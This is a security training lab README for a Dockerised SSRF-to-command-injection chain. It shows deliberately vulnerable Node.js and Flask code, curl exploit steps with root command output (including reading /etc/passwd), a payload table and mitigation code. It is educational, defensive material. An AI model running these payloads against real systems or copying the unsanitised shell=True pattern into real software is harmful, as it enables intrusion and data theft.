# Lab 15: SSRF to RCE Chain — Public API to Internal Command Injection

## 📌 Description

This lab models a real-world **SSRF to RCE pivot chain**. A public-facing Node.js application exposes a URL preview feature that blindly fetches whatever URL a user provides. Behind it sits an internal Python/Flask backend with no public port exposure — it trusts requests coming from the internal network and fails to sanitize user input in a system command.

An unauthenticated attacker can exploit the SSRF vulnerability in the public app to reach the hidden internal backend, then chain it with command injection in the internal service's ping endpoint to achieve **Remote Code Execution as root**.

**Attack Pattern:** SSRF (CWE-918) → Command Injection (CWE-78)  
**Impact:** Unauthenticated Remote Code Execution (RCE)  
**Architecture:** Public Node.js → Internal Python/Flask

---

## 🏗️ Environment Setup

```bash
# Build and start both services
docker compose up --build -d

# Verify containers are running
docker compose ps

# Test public app
curl http://localhost:8095/
```

**Services:*8

- **Public App:** `http://localhost:8095` (Node.js/Express)

- **Internal Backend:** `http://internal-backend:5000` (Python/Flask — NOT publicly exposed)

## 🔍 Vulnerability Analysis

### The Vulnerable Code

**Public App (SSRF):**
```javascript
// server.js — /api/preview endpoint
app.get('/api/preview', async (req, res) => {
    const targetUrl = req.query.url;  // User-controlled input
    
    // VULNERABILITY: No validation on target URL
    const response = await axios.get(targetUrl);
    return res.send(response.data);
});
```

**Internal Backend (Command Injection):**

```python
# app.py — /api/maintenance/ping endpoint
@app.route('/api/maintenance/ping')
def system_ping():
    host = request.args.get('host')  // User-controlled input via SSRF
    
    # VULNERABILITY: Unsanitized input in shell command
    command = f"ping -c 1 {host}"
    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    return jsonify({"status": "success", "output": output})
```

### Why It's Vulnerable

1. **Public App has SSRF:** The `/api/preview` endpoint fetches any URL without validation

2. **Internal Backend has No Auth:** Assumes requests from internal network are trusted

3. **Internal Backend has Command Injection:** `host` parameter goes directly into `shell=True`

4. **No Network Segmentation:** Both containers share the same Docker network


## 💥 Exploitation

### Step 1: Verify Public App
```bash
curl http://localhost:8095/
```

### Step 2: Test SSRF — Access Internal Backend

```bash
curl "http://localhost:8095/api/preview?url=http://internal-backend:5000/"
```

**✅ Output:**

```text
Secure Internal Management Portal. Authorized Access Only.
```

The internal backend is accessible via SSRF!

### Step 3: Chain SSRF → Command Injection

Execute commands through the SSRF pivot:

```bash
# Execute 'id' command
curl "http://localhost:8095/api/preview?url=http://internal-backend:5000/api/maintenance/ping?host=127.0.0.1;id"
```

**✅ Output:**

```json
{
  "output": "/bin/sh: 1: ping: not found\nuid=0(root) gid=0(root) groups=0(root)\n",
  "status": "success"
}
```

**RCE confirmed — running as root!**

### Step 4: Write a File to Verify RCE

```bash
# Create a file via the SSRF chain
curl "http://localhost:8095/api/preview?url=http://internal-backend:5000/api/maintenance/ping?host=127.0.0.1;touch+/tmp/pwned_by_ssrf_chain"

# Verify file was created
docker exec zero2shell-lab15-internal ls -la /tmp/pwned_by_ssrf_chain
```

**✅ Output:** `-rw-r--r-- 1 root root 0 ... /tmp/pwned_by_ssrf_chain`

### Step 5: Read System Files

```bash
# Read /etc/passwd via SSRF chain
curl "http://localhost:8095/api/preview?url=http://internal-backend:5000/api/maintenance/ping?host=127.0.0.1;cat+/etc/passwd"
```

**✅ Output:** Full contents of `/etc/passwd` returned in HTTP response

```json
{"output":"/bin/sh: 1: ping: not found\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","status":"success"} 
```

### Step 6: List Directory Contents

```bash
# List internal backend files
curl "http://localhost:8095/api/preview?url=http://internal-backend:5000/api/maintenance/ping?host=127.0.0.1;ls+-la"
```
**✅ Output:**

```json
{"output":"/bin/sh: 1: ping: not found\ntotal 12\ndrwxr-xr-x 1 root root 4096 Jun 26 11:29 .\ndrwxr-xr-x 1 root root 4096 Jun 26 11:31 ..\n-rw-r--r-- 1 root root 1038 Jun 25 19:51 app.py\n","status":"success"}
```

### Exploitation Payloads Reference

| Command | Description |
|---------|-------------|
| `;id` | Execute system command |
| `;touch+/tmp/pwned` | Create a file |
| `;cat+/etc/passwd` | Read system files |
| `;ls+-la` | List directory contents |
| `;whoami` | Show current user |
| `;ps+aux` | List running processes |
| `;ip+addr` | Check network configuration |

### URL Encoding Reference

| Character | URL Encoded |
|-----------|-------------|
| Space | `+` or `%20` |
| `;` | `;` or `%3B` |
| `&` | `%26` |
| `$` | `%24` |


## 🛡️ Mitigation

### Public App Fix (SSRF Prevention)

```javascript
// Validate and restrict URLs
const allowedDomains = ['example.com', 'trusted.org'];
const parsedUrl = new URL(targetUrl);

if (!allowedDomains.includes(parsedUrl.hostname)) {
    return res.status(403).json({ error: "Domain not allowed" });
}

// Use IP whitelist instead of domain
// Block internal IPs: 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
```

### Internal Backend Fix (Command Injection Prevention)

```python
# Use list arguments instead of shell=True
command = ["ping", "-c", "1", host]
subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)

# Or validate input
import re
if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
    return jsonify({"status": "error", "message": "Invalid host"}), 400
```

---

## 🔧 Challenge: Fix It Yourself

Now that you've exploited this lab, try to **patch the vulnerable code** yourself:

1. **Apply the mitigation fixes** above to `public-app/server.js` and `internal-backend/app.py`
2. **Rebuild the containers:**
   ```bash
   docker compose down
   docker compose up --build -d
   ```

3. **Run the exploit again** — does it still work?

4. **Try to bypass your own patch** — can you find a way around it?


**💡 The best way to learn secure coding is to break it, fix it, then try to break it again.** If you find a bypass to your own fix, **congratulations** — you're thinking like a real attacker!


## 📚 References

[CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

[CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

[SSRF TO RCE Chain](https://pluto.security/blog/mcpwnfluence-cve-2026-27825-critical/)

[OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

[OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

[Blind SSRF to RCE](https://blog.cyberadvisors.com/technical-blog/from-blind-ssrf-to-rce-how-source-code-review-exposed-a-critical-exploit-chain) 
